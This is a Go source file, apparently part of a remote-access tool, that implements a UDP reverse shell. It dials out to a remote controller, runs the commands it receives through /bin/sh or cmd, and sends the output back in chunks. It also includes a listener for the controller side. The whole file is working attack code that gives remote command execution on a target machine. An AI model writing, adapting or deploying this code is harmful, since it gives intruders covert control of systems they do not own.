package agentprops

import (
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"strings"
)

const BUFFSIZE = 1024

type UDPShellProps struct {
	RemoteServer     string
	TargetUDPConn    *net.UDPConn
	ResultToSend     []byte
	UDPPort          string
	CommandToExecute string
}

type UDPRevShellFunctions interface {
	DialUpUDP() (*net.UDPConn, error)
	SendResultToController()
	StartUDPController() (*net.UDPConn, error)
	SetControllerPrompt()
}

func (udpShellProps *UDPShellProps) DialUpUDP() (*net.UDPConn, error) {
	udpremoteaddr, err := net.ResolveUDPAddr("udp4", udpShellProps.RemoteServer+":"+udpShellProps.UDPPort)
	if err != nil {
		err = fmt.Errorf("Remote address resolve error")
		return nil, err
	}
	udpconn, err := net.DialUDP("udp4", nil, udpremoteaddr)
	if err != nil {
		err = fmt.Errorf("UDP Dial Up  error")
		return nil, err
	}
	return udpconn, nil
}

func (udpShellProps *UDPShellProps) SendResultToController() {
	j := 0
	if len(udpShellProps.ResultToSend) <= BUFFSIZE {
		udpShellProps.TargetUDPConn.Write(udpShellProps.ResultToSend)
	} else {

		i := BUFFSIZE
		for {
			if i > len(udpShellProps.ResultToSend) {
				writetill := len(udpShellProps.ResultToSend)
				udpShellProps.TargetUDPConn.Write(udpShellProps.ResultToSend[j:writetill])
				break
			} else {

				udpShellProps.TargetUDPConn.Write(udpShellProps.ResultToSend[j:i])
				j = i
			}
			i = i + BUFFSIZE
		}

	}
}

func (udpShellProps *UDPShellProps) StartUDPController() (*net.UDPConn, error) {
	udplocaladdr, err := net.ResolveUDPAddr("udp4", udpShellProps.UDPPort)
	if err != nil {
		err = fmt.Errorf("Could not resolve the address and port")
		return nil, err
	}
	udpconn, err := net.ListenUDP("udp4", udplocaladdr)
	if err != nil {
		err = fmt.Errorf("UDP Listen error")
		return nil, err
	}
	return udpconn, nil
}
func (udpShellProps *UDPShellProps) ExecCmd() []byte {
	command := strings.ReplaceAll(udpShellProps.CommandToExecute, "\r\n", "")
	var osshell string
	osshellargs := []string{"/C", command}

	if runtime.GOOS == "linux" {
		osshell = "/bin/sh"
		osshellargs = []string{"-c", command}

	} else {
		osshell = "cmd"
	}
	execcmd := exec.Command(osshell, osshellargs...)
	cmdout, _ := execcmd.Output()
	return cmdout
}
